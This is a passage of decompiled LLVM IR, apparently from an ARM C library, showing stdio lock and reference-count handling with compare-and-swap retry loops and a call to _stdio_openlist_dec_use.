  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_b2f8 = add i32 %v4_b2ec, 8
  %v2_b2f8 = inttoptr i32 %v1_b2f8 to i32*
  %v3_b2f8 = load i32, i32* %v2_b2f8, align 4
  store i32 %v3_b2f8, i32* %r3.global-to-local, align 4
  %v0_b2fc = call i32 @__aeabi_read_tp()
  store i32 %v0_b2fc, i32* %r0.global-to-local, align 4
  %v1_b300 = add i32 %v0_b2fc, -1168
  store i32 %v1_b300, i32* %sl.global-to-local, align 4
  %v0_b304 = load i32, i32* %r3.global-to-local, align 4
  %v3_b304 = icmp uge i32 %v0_b304, %v1_b300
  store i1 %v3_b304, i1* %cpsr_c.global-to-local, align 1
  %v9_b304 = icmp eq i32 %v0_b304, %v1_b300
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_b30c = load i32, i32* @r5, align 4
  %v2_b30c = add i32 %v1_b30c, 4
  %v3_b30c = inttoptr i32 %v2_b30c to i32*
  store i32 -1, i32* %v3_b30c, align 4
  br i1 %v9_b304, label %dec_label_pc_b354, label %dec_label_pc_b314

dec_label_pc_b314:                                ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_b318 = load i32, i32* @r7, align 4
  store i32 %v0_b318, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_b320108 = inttoptr i32 %v0_b318 to i32*
  %v2_b320109 = load i32, i32* %v1_b320108, align 4
  store i32 %v2_b320109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_b324111 = icmp eq i32 %v2_b320109, 0
  br i1 %v9_b324111, label %dec_label_pc_b32c, label %dec_label_pc_b344

dec_label_pc_b32c:                                ; preds = %dec_label_pc_b314, %dec_label_pc_b32c.dec_label_pc_b320_crit_edge
  %v0_b32c112 = phi i32 [ %v1_b324.pre, %dec_label_pc_b32c.dec_label_pc_b320_crit_edge ], [ 0, %dec_label_pc_b314 ]
  store i32 %v0_b32c112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b33c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b33c, label %dec_label_pc_b340, label %dec_label_pc_b32c.dec_label_pc_b320_crit_edge

dec_label_pc_b32c.dec_label_pc_b320_crit_edge:    ; preds = %dec_label_pc_b32c
  %v0_b320.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b324.pre = load i32, i32* @r4, align 4
  %v1_b320 = inttoptr i32 %v0_b320.pre to i32*
  %v2_b320 = load i32, i32* %v1_b320, align 4
  store i32 %v2_b320, i32* %r3.global-to-local, align 4
  %v3_b324 = icmp uge i32 %v2_b320, %v1_b324.pre
  store i1 %v3_b324, i1* %cpsr_c.global-to-local, align 1
  %v9_b324 = icmp eq i32 %v2_b320, %v1_b324.pre
  br i1 %v9_b324, label %dec_label_pc_b32c, label %dec_label_pc_b344

dec_label_pc_b340:                                ; preds = %dec_label_pc_b32c
  %v0_b340 = load i32, i32* @r4, align 4
  store i32 %v0_b340, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b344

dec_label_pc_b344:                                ; preds = %dec_label_pc_b314, %dec_label_pc_b32c.dec_label_pc_b320_crit_edge, %dec_label_pc_b340
  %v0_b344 = phi i32 [ %v0_b340, %dec_label_pc_b340 ], [ %v2_b320109, %dec_label_pc_b314 ], [ %v2_b320, %dec_label_pc_b32c.dec_label_pc_b320_crit_edge ]
  %v1_b344 = phi i32 [ %v0_b340, %dec_label_pc_b340 ], [ 0, %dec_label_pc_b314 ], [ %v1_b324.pre, %dec_label_pc_b32c.dec_label_pc_b320_crit_edge ]
  %v3_b344 = icmp uge i32 %v0_b344, %v1_b344
  store i1 %v3_b344, i1* %cpsr_c.global-to-local, align 1
  %v9_b344 = icmp eq i32 %v0_b344, %v1_b344
  br i1 %v9_b344, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_b344
  %v1_b348 = load i32, i32* @r7, align 4
  store i32 %v1_b348, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_b344, %bb46
  %v1_b34c = xor i1 %v9_b344, true
  call void @__pseudo_cond_branch(i1 %v1_b34c, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_b350 = load i32, i32* %sl.global-to-local, align 4
  %v1_b350 = load i32, i32* @r7, align 4
  %v2_b350 = add i32 %v1_b350, 8
  %v3_b350 = inttoptr i32 %v2_b350 to i32*
  store i32 %v0_b350, i32* %v3_b350, align 4
  br label %dec_label_pc_b354

dec_label_pc_b354:                                ; preds = %bb45, %bb47
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b358 = load i32, i32* @r8, align 4
  %v2_b358 = add i32 %v0_b358, 168
  %v3_b358 = inttoptr i32 %v2_b358 to i32*
  %v4_b358 = load i32, i32* %v3_b358, align 4
  store i32 %v4_b358, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_b360 = add i32 %v0_b358, 12
  %v3_b360 = inttoptr i32 %v2_b360 to i32*
  %v4_b360 = load i32, i32* %v3_b360, align 4
  store i32 %v4_b360, i32* %r2.global-to-local, align 4
  %v1_b364 = add i32 %v4_b358, 4
  %v2_b364 = inttoptr i32 %v1_b364 to i32*
  %v3_b364 = load i32, i32* %v2_b364, align 4
  store i32 %v3_b364, i32* %r1.global-to-local, align 4
  %v1_b368 = inttoptr i32 %v4_b360 to i32*
  %v2_b368 = load i32, i32* %v1_b368, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b36c = icmp eq i32 %v3_b364, 0
  %v1_b370 = add i32 %v2_b368, 1
  store i32 %v1_b370, i32* %r3.global-to-local, align 4
  store i32 %v1_b370, i32* %v1_b368, align 4
  br i1 %v2_b36c, label %dec_label_pc_b37c, label %dec_label_pc_b3dc

dec_label_pc_b37c:                                ; preds = %dec_label_pc_b354
  %v0_b37c = load i32, i32* %r1.global-to-local, align 4
  %v1_b37c = load i32, i32* %r0.global-to-local, align 4
  %v2_b37c = add i32 %v1_b37c, 8
  %v3_b37c = inttoptr i32 %v2_b37c to i32*
  store i32 %v0_b37c, i32* %v3_b37c, align 4
  %v0_b380 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b380, i32* @r7, align 4
  br label %dec_label_pc_b384

dec_label_pc_b384:                                ; preds = %dec_label_pc_b3b4.dec_label_pc_b384_crit_edge, %dec_label_pc_b37c
  %v0_b384 = phi i32 [ %v0_b384.pre, %dec_label_pc_b3b4.dec_label_pc_b384_crit_edge ], [ %v0_b380, %dec_label_pc_b37c ]
  %v1_b384 = inttoptr i32 %v0_b384 to i32*
  %v2_b384 = load i32, i32* %v1_b384, align 4
  store i32 %v2_b384, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_b384, i32* %r2.global-to-local, align 4
  %v2_b39096 = load i32, i32* %v1_b384, align 4
  store i32 %v2_b39096, i32* %r3.global-to-local, align 4
  %v3_b39498 = icmp uge i32 %v2_b39096, %v2_b384
  store i1 %v3_b39498, i1* %cpsr_c.global-to-local, align 1
  %v9_b394104 = icmp eq i32 %v2_b39096, %v2_b384
  br i1 %v9_b394104, label %dec_label_pc_b39c, label %dec_label_pc_b3b4

dec_label_pc_b39c:                                ; preds = %dec_label_pc_b384, %dec_label_pc_b39c.dec_label_pc_b390_crit_edge
  %v0_b39c105 = phi i32 [ %v1_b394.pre, %dec_label_pc_b39c.dec_label_pc_b390_crit_edge ], [ %v2_b384, %dec_label_pc_b384 ]
  store i32 %v0_b39c105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b3ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b3ac, label %dec_label_pc_b3b0, label %dec_label_pc_b39c.dec_label_pc_b390_crit_edge

dec_label_pc_b39c.dec_label_pc_b390_crit_edge:    ; preds = %dec_label_pc_b39c
  %v0_b390.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b394.pre = load i32, i32* @r4, align 4
  %v1_b390 = inttoptr i32 %v0_b390.pre to i32*
  %v2_b390 = load i32, i32* %v1_b390, align 4
  store i32 %v2_b390, i32* %r3.global-to-local, align 4
  %v3_b394 = icmp uge i32 %v2_b390, %v1_b394.pre
  store i1 %v3_b394, i1* %cpsr_c.global-to-local, align 1
  %v9_b394 = icmp eq i32 %v2_b390, %v1_b394.pre
  br i1 %v9_b394, label %dec_label_pc_b39c, label %dec_label_pc_b3b4

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b39c
  %v0_b3b0 = load i32, i32* @r4, align 4
  store i32 %v0_b3b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b3b4

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b384, %dec_label_pc_b39c.dec_label_pc_b390_crit_edge, %dec_label_pc_b3b0
  %v0_b3bc = phi i32 [ %v0_b3b0, %dec_label_pc_b3b0 ], [ %v2_b39096, %dec_label_pc_b384 ], [ %v2_b390, %dec_label_pc_b39c.dec_label_pc_b390_crit_edge ]
  %v1_b3b4 = phi i32 [ %v0_b3b0, %dec_label_pc_b3b0 ], [ %v2_b384, %dec_label_pc_b384 ], [ %v1_b394.pre, %dec_label_pc_b39c.dec_label_pc_b390_crit_edge ]
  %v3_b3b4 = icmp uge i32 %v0_b3bc, %v1_b3b4
  store i1 %v3_b3b4, i1* %cpsr_c.global-to-local, align 1
  %v9_b3b4 = icmp eq i32 %v0_b3bc, %v1_b3b4
  br i1 %v9_b3b4, label %dec_label_pc_b3bc, label %dec_label_pc_b3b4.dec_label_pc_b384_crit_edge

dec_label_pc_b3b4.dec_label_pc_b384_crit_edge:    ; preds = %dec_label_pc_b3b4
  %v0_b384.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b384

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b3b4
  %v2_b3bc = icmp ne i32 %v1_b3b4, 0
  store i1 %v2_b3bc, i1* %cpsr_c.global-to-local, align 1
  %v7_b3c0 = icmp slt i32 %v1_b3b4, 2
  br i1 %v7_b3c0, label %dec_label_pc_b3dc, label %dec_label_pc_b3c4

dec_label_pc_b3c4:                                ; preds = %dec_label_pc_b3bc
  %v0_b3c4 = load i32, i32* @r7, align 4
  store i32 %v0_b3c4, i32* %r0.global-to-local, align 4
  %v0_b3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3c8 = add i32 %v0_b3c8, 129
  store i32 %v1_b3c8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b3dc

dec_label_pc_b3dc:                                ; preds = %dec_label_pc_b354, %dec_label_pc_b3c4, %dec_label_pc_b3bc
  %v0_b3dc = load i32, i32* @r5, align 4
  %v1_b3dc = inttoptr i32 %v0_b3dc to i16*
  %v2_b3dc = load i16, i16* %v1_b3dc, align 2
  %v3_b3dc = zext i16 %v2_b3dc to i32
  %v1_b3e0 = and i32 %v3_b3dc, 24576
  %v1_b3e4 = or i32 %v1_b3e0, 48
  store i32 %v1_b3e4, i32* %r3.global-to-local, align 4
  %v0_b3e8 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b3e8 = icmp eq i32 %v0_b3e8, 0
  %v1_b3ec = trunc i32 %v1_b3e4 to i16
  store i16 %v1_b3ec, i16* %v1_b3dc, align 2
  br i1 %v2_b3e8, label %dec_label_pc_b3f4, label %dec_label_pc_b468

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3dc
  %v0_b3f4 = load i32, i32* @r5, align 4
  %v1_b3f4 = add i32 %v0_b3f4, 60
  %v2_b3f4 = inttoptr i32 %v1_b3f4 to i32*
  %v3_b3f4 = load i32, i32* %v2_b3f4, align 4
  %v1_b3f8 = add i32 %v3_b3f4, -1
  store i32 %v1_b3f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b3fc = icmp eq i32 %v1_b3f8, 0
  store i32 %v1_b3f8, i32* %v2_b3f4, align 4
  br i1 %v2_b3fc, label %dec_label_pc_b408, label %dec_label_pc_b468

dec_label_pc_b408:                                ; preds = %dec_label_pc_b3f4
  %v0_b408 = load i32, i32* %r3.global-to-local, align 4
  %v1_b408 = load i32, i32* @r5, align 4
  %v2_b408 = add i32 %v1_b408, 64
  %v3_b408 = inttoptr i32 %v2_b408 to i32*
  store i32 %v0_b408, i32* %v3_b408, align 4
  %v0_b40c = load i32, i32* @r5, align 4
  %v1_b40c = add i32 %v0_b40c, 56
  store i32 %v1_b40c, i32* @r6, align 4
  br label %dec_label_pc_b410

dec_label_pc_b410:                                ; preds = %dec_label_pc_b440.dec_label_pc_b410_crit_edge, %dec_label_pc_b408
  %v0_b418 = phi i32 [ %v0_b418.pre, %dec_label_pc_b440.dec_label_pc_b410_crit_edge ], [ %v1_b40c, %dec_label_pc_b408 ]
  %v0_b410 = phi i32 [ %v0_b410.pre, %dec_label_pc_b440.dec_label_pc_b410_crit_edge ], [ %v0_b40c, %dec_label_pc_b408 ]
  %v1_b410 = add i32 %v0_b410, 56
  %v2_b410 = inttoptr i32 %v1_b410 to i32*
  %v3_b410 = load i32, i32* %v2_b410, align 4
  store i32 %v3_b410, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_b418, i32* %r2.global-to-local, align 4
  %v1_b41c82 = inttoptr i32 %v0_b418 to i32*
  %v2_b41c83 = load i32, i32* %v1_b41c82, align 4
  store i32 %v2_b41c83, i32* %r3.global-to-local, align 4
  %v3_b42085 = icmp uge i32 %v2_b41c83, %v3_b410
  store i1 %v3_b42085, i1* %cpsr_c.global-to-local, align 1
  %v9_b42091 = icmp eq i32 %v2_b41c83, %v3_b410
  br i1 %v9_b42091, label %dec_label_pc_b428, label %dec_label_pc_b440

dec_label_pc_b428:                                ; preds = %dec_label_pc_b410, %dec_label_pc_b428.dec_label_pc_b41c_crit_edge
  %v0_b42892 = phi i32 [ %v1_b420.pre, %dec_label_pc_b428.dec_label_pc_b41c_crit_edge ], [ %v3_b410, %dec_label_pc_b410 ]
  store i32 %v0_b42892, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b438 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b438, label %dec_label_pc_b43c, label %dec_label_pc_b428.dec_label_pc_b41c_crit_edge

dec_label_pc_b428.dec_label_pc_b41c_crit_edge:    ; preds = %dec_label_pc_b428
  %v0_b41c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b420.pre = load i32, i32* @r4, align 4
  %v1_b41c = inttoptr i32 %v0_b41c.pre to i32*
  %v2_b41c = load i32, i32* %v1_b41c, align 4
  store i32 %v2_b41c, i32* %r3.global-to-local, align 4
  %v3_b420 = icmp uge i32 %v2_b41c, %v1_b420.pre
  store i1 %v3_b420, i1* %cpsr_c.global-to-local, align 1
  %v9_b420 = icmp eq i32 %v2_b41c, %v1_b420.pre
  br i1 %v9_b420, label %dec_label_pc_b428, label %dec_label_pc_b440

dec_label_pc_b43c:                                ; preds = %dec_label_pc_b428
  %v0_b43c = load i32, i32* @r4, align 4
  store i32 %v0_b43c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b440

dec_label_pc_b440:                                ; preds = %dec_label_pc_b410, %dec_label_pc_b428.dec_label_pc_b41c_crit_edge, %dec_label_pc_b43c
  %v0_b448 = phi i32 [ %v0_b43c, %dec_label_pc_b43c ], [ %v2_b41c83, %dec_label_pc_b410 ], [ %v2_b41c, %dec_label_pc_b428.dec_label_pc_b41c_crit_edge ]
  %v1_b440 = phi i32 [ %v0_b43c, %dec_label_pc_b43c ], [ %v3_b410, %dec_label_pc_b410 ], [ %v1_b420.pre, %dec_label_pc_b428.dec_label_pc_b41c_crit_edge ]
  %v3_b440 = icmp uge i32 %v0_b448, %v1_b440
  store i1 %v3_b440, i1* %cpsr_c.global-to-local, align 1
  %v9_b440 = icmp eq i32 %v0_b448, %v1_b440
  br i1 %v9_b440, label %dec_label_pc_b448, label %dec_label_pc_b440.dec_label_pc_b410_crit_edge

dec_label_pc_b440.dec_label_pc_b410_crit_edge:    ; preds = %dec_label_pc_b440
  %v0_b410.pre = load i32, i32* @r5, align 4
  %v0_b418.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b410

dec_label_pc_b448:                                ; preds = %dec_label_pc_b440
  %v2_b448 = icmp ne i32 %v1_b440, 0
  store i1 %v2_b448, i1* %cpsr_c.global-to-local, align 1
  %v7_b44c = icmp slt i32 %v1_b440, 2
  br i1 %v7_b44c, label %dec_label_pc_b468, label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b448
  %v0_b450 = load i32, i32* @r5, align 4
  %v1_b450 = add i32 %v0_b450, 56
  store i32 %v1_b450, i32* %r0.global-to-local, align 4
  %v0_b454 = load i32, i32* %r1.global-to-local, align 4
  %v1_b454 = add i32 %v0_b454, 129
  store i32 %v1_b454, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b3f4, %dec_label_pc_b3dc, %dec_label_pc_b450, %dec_label_pc_b448
  %v0_b468 = load i32, i32* @r5, align 4
  %v1_b468 = inttoptr i32 %v0_b468 to i16*
  %v2_b468 = load i16, i16* %v1_b468, align 2
  %v3_b468 = zext i16 %v2_b468 to i32
  store i32 %v3_b468, i32* %r3.global-to-local, align 4
  %v1_b46c = and i32 %v3_b468, 16384
  %v2_b46c = icmp eq i32 %v1_b46c, 0
  br i1 %v2_b46c, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_b468
  %v2_b470 = add i32 %v0_b468, 8
  %v3_b470 = inttoptr i32 %v2_b470 to i32*
  %v4_b470 = load i32, i32* %v3_b470, align 4
  store i32 %v4_b470, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_b468, %bb48
  %v1_b474 = xor i1 %v2_b46c, true
  call void @__pseudo_cond_branch(i1 %v1_b474, i32 ptrtoint (i32* @global_var_f3b8.198 to i32))
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b47c = load i32, i32* @r8, align 4
  %v2_b47c = add i32 %v0_b47c, 168
  %v3_b47c = inttoptr i32 %v2_b47c to i32*
  %v4_b47c = load i32, i32* %v3_b47c, align 4
  store i32 %v4_b47c, i32* @r5, align 4
  %v1_b480 = add i32 %v4_b47c, 8
  %v2_b480 = inttoptr i32 %v1_b480 to i32*
  %v3_b480 = load i32, i32* %v2_b480, align 4
  store i32 %v3_b480, i32* %r3.global-to-local, align 4
  %v1_b484 = load i32, i32* %sl.global-to-local, align 4
  %v3_b484 = icmp uge i32 %v3_b480, %v1_b484
  store i1 %v3_b484, i1* %cpsr_c.global-to-local, align 1
  %v9_b484 = icmp eq i32 %v3_b480, %v1_b484
  br i1 %v9_b484, label %dec_label_pc_b4cc, label %dec_label_pc_b48c

dec_label_pc_b48c:                                ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_b47c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_b49875 = inttoptr i32 %v4_b47c to i32*
  %v2_b49876 = load i32, i32* %v1_b49875, align 4
  store i32 %v2_b49876, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_b49c78 = icmp eq i32 %v2_b49876, 0
  br i1 %v9_b49c78, label %dec_label_pc_b4a4, label %dec_label_pc_b4bc

dec_label_pc_b4a4:                                ; preds = %dec_label_pc_b48c, %dec_label_pc_b4a4.dec_label_pc_b498_crit_edge
  %v0_b4a479 = phi i32 [ %v1_b49c.pre, %dec_label_pc_b4a4.dec_label_pc_b498_crit_edge ], [ 0, %dec_label_pc_b48c ]
  store i32 %v0_b4a479, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b4b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b4b4, label %dec_label_pc_b4b8, label %dec_label_pc_b4a4.dec_label_pc_b498_crit_edge

dec_label_pc_b4a4.dec_label_pc_b498_crit_edge:    ; preds = %dec_label_pc_b4a4
  %v0_b498.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b49c.pre = load i32, i32* @r4, align 4
  %v1_b498 = inttoptr i32 %v0_b498.pre to i32*
  %v2_b498 = load i32, i32* %v1_b498, align 4
  store i32 %v2_b498, i32* %r3.global-to-local, align 4
  %v3_b49c = icmp uge i32 %v2_b498, %v1_b49c.pre
  store i1 %v3_b49c, i1* %cpsr_c.global-to-local, align 1
  %v9_b49c = icmp eq i32 %v2_b498, %v1_b49c.pre
  br i1 %v9_b49c, label %dec_label_pc_b4a4, label %dec_label_pc_b4bc

dec_label_pc_b4b8:                                ; preds = %dec_label_pc_b4a4
  %v0_b4b8 = load i32, i32* @r4, align 4
  store i32 %v0_b4b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b4bc

dec_label_pc_b4bc:                                ; preds = %dec_label_pc_b48c, %dec_label_pc_b4a4.dec_label_pc_b498_crit_edge, %dec_label_pc_b4b8
  %v0_b4bc = phi i32 [ %v0_b4b8, %dec_label_pc_b4b8 ], [ %v2_b49876, %dec_label_pc_b48c ], [ %v2_b498, %dec_label_pc_b4a4.dec_label_pc_b498_crit_edge ]
  %v1_b4bc = phi i32 [ %v0_b4b8, %dec_label_pc_b4b8 ], [ 0, %dec_label_pc_b48c ], [ %v1_b49c.pre, %dec_label_pc_b4a4.dec_label_pc_b498_crit_edge ]
  %v3_b4bc = icmp uge i32 %v0_b4bc, %v1_b4bc
  store i1 %v3_b4bc, i1* %cpsr_c.global-to-local, align 1
  %v9_b4bc = icmp eq i32 %v0_b4bc, %v1_b4bc
  br i1 %v9_b4bc, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_b4bc
  %v1_b4c0 = load i32, i32* @r5, align 4
  store i32 %v1_b4c0, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_b4bc, %bb50
  %v1_b4c4 = xor i1 %v9_b4bc, true
  call void @__pseudo_cond_branch(i1 %v1_b4c4, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_b4c8 = load i32, i32* %sl.global-to-local, align 4
  %v1_b4c8 = load i32, i32* @r5, align 4
  %v2_b4c8 = add i32 %v1_b4c8, 8
  %v3_b4c8 = inttoptr i32 %v2_b4c8 to i32*
  store i32 %v0_b4c8, i32* %v3_b4c8, align 4
  %v0_b4d0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b4cc

dec_label_pc_b4cc:                                ; preds = %bb49, %bb51
  %v0_b4d0 = phi i32 [ %v0_b47c, %bb49 ], [ %v0_b4d0.pre, %bb51 ]
  store i32 88, i32* %r3.global-to-local, align 4
  %v2_b4d0 = add i32 %v0_b4d0, 88
  %v3_b4d0 = inttoptr i32 %v2_b4d0 to i32*
  %v4_b4d0 = load i32, i32* %v3_b4d0, align 4
  store i32 %v4_b4d0, i32* %r2.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_b4d8 = add i32 %v0_b4d0, 168
  %v3_b4d8 = inttoptr i32 %v2_b4d8 to i32*
  %v4_b4d8 = load i32, i32* %v3_b4d8, align 4
  store i32 %v4_b4d8, i32* %r0.global-to-local, align 4
  %v1_b4dc = inttoptr i32 %v4_b4d0 to i32*
  %v2_b4dc = load i32, i32* %v1_b4dc, align 4
  store i32 %v2_b4dc, i32* %r3.global-to-local, align 4
  %v1_b4e0 = add i32 %v4_b4d8, 4
  %v2_b4e0 = inttoptr i32 %v1_b4e0 to i32*
  %v3_b4e0 = load i32, i32* %v2_b4e0, align 4
  store i32 %v3_b4e0, i32* %r1.global-to-local, align 4
  %v1_b4e4 = add i32 %v2_b4dc, 1
  store i32 %v1_b4e4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b4e8 = icmp eq i32 %v3_b4e0, 0
  store i32 %v1_b4e4, i32* %v1_b4dc, align 4
  br i1 %v2_b4e8, label %dec_label_pc_b4f4, label %dec_label_pc_b554

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b4cc
  %v0_b4f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b4f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_b4f4 = add i32 %v1_b4f4, 8
  %v3_b4f4 = inttoptr i32 %v2_b4f4 to i32*
  store i32 %v0_b4f4, i32* %v3_b4f4, align 4
  %v0_b4f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b4f8, i32* @r5, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b4fc:                                ; preds = %dec_label_pc_b52c.dec_label_pc_b4fc_crit_edge, %dec_label_pc_b4f4
  %v0_b4fc = phi i32 [ %v0_b4fc.pre, %dec_label_pc_b52c.dec_label_pc_b4fc_crit_edge ], [ %v0_b4f8, %dec_label_pc_b4f4 ]
  %v1_b4fc = inttoptr i32 %v0_b4fc to i32*
  %v2_b4fc = load i32, i32* %v1_b4fc, align 4
  store i32 %v2_b4fc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_b4fc, i32* %r2.global-to-local, align 4
  %v2_b50864 = load i32, i32* %v1_b4fc, align 4
  store i32 %v2_b50864, i32* %r3.global-to-local, align 4
  %v3_b50c66 = icmp uge i32 %v2_b50864, %v2_b4fc
  store i1 %v3_b50c66, i1* %cpsr_c.global-to-local, align 1
  %v9_b50c72 = icmp eq i32 %v2_b50864, %v2_b4fc
  br i1 %v9_b50c72, label %dec_label_pc_b514, label %dec_label_pc_b52c

dec_label_pc_b514:                                ; preds = %dec_label_pc_b4fc, %dec_label_pc_b514.dec_label_pc_b508_crit_edge
  %v0_b51473 = phi i32 [ %v1_b50c.pre, %dec_label_pc_b514.dec_label_pc_b508_crit_edge ], [ %v2_b4fc, %dec_label_pc_b4fc ]
  store i32 %v0_b51473, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b524 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b524, label %dec_label_pc_b528, label %dec_label_pc_b514.dec_label_pc_b508_crit_edge

dec_label_pc_b514.dec_label_pc_b508_crit_edge:    ; preds = %dec_label_pc_b514
  %v0_b508.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b50c.pre = load i32, i32* @r4, align 4
  %v1_b508 = inttoptr i32 %v0_b508.pre to i32*
  %v2_b508 = load i32, i32* %v1_b508, align 4
  store i32 %v2_b508, i32* %r3.global-to-local, align 4
  %v3_b50c = icmp uge i32 %v2_b508, %v1_b50c.pre
  store i1 %v3_b50c, i1* %cpsr_c.global-to-local, align 1
  %v9_b50c = icmp eq i32 %v2_b508, %v1_b50c.pre
  br i1 %v9_b50c, label %dec_label_pc_b514, label %dec_label_pc_b52c

dec_label_pc_b528:                                ; preds = %dec_label_pc_b514
  %v0_b528 = load i32, i32* @r4, align 4
  store i32 %v0_b528, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b52c

dec_label_pc_b52c:                                ; preds = %dec_label_pc_b4fc, %dec_label_pc_b514.dec_label_pc_b508_crit_edge, %dec_label_pc_b528
  %v0_b534 = phi i32 [ %v0_b528, %dec_label_pc_b528 ], [ %v2_b50864, %dec_label_pc_b4fc ], [ %v2_b508, %dec_label_pc_b514.dec_label_pc_b508_crit_edge ]
  %v1_b52c = phi i32 [ %v0_b528, %dec_label_pc_b528 ], [ %v2_b4fc, %dec_label_pc_b4fc ], [ %v1_b50c.pre, %dec_label_pc_b514.dec_label_pc_b508_crit_edge ]
  %v3_b52c = icmp uge i32 %v0_b534, %v1_b52c
  store i1 %v3_b52c, i1* %cpsr_c.global-to-local, align 1
  %v9_b52c = icmp eq i32 %v0_b534, %v1_b52c
  br i1 %v9_b52c, label %dec_label_pc_b534, label %dec_label_pc_b52c.dec_label_pc_b4fc_crit_edge

dec_label_pc_b52c.dec_label_pc_b4fc_crit_edge:    ; preds = %dec_label_pc_b52c
  %v0_b4fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b534:                                ; preds = %dec_label_pc_b52c
  %v2_b534 = icmp ne i32 %v1_b52c, 0
  store i1 %v2_b534, i1* %cpsr_c.global-to-local, align 1
  %v7_b538 = icmp slt i32 %v1_b52c, 2
  br i1 %v7_b538, label %dec_label_pc_b554, label %dec_label_pc_b53c

dec_label_pc_b53c:                                ; preds = %dec_label_pc_b534
  %v0_b53c = load i32, i32* @r5, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v0_b540 = load i32, i32* %r1.global-to-local, align 4
  %v1_b540 = add i32 %v0_b540, 129
  store i32 %v1_b540, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b4cc, %dec_label_pc_b53c, %dec_label_pc_b534
  %v0_b554 = call i32 @_stdio_openlist_dec_use()
  %v0_b558 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
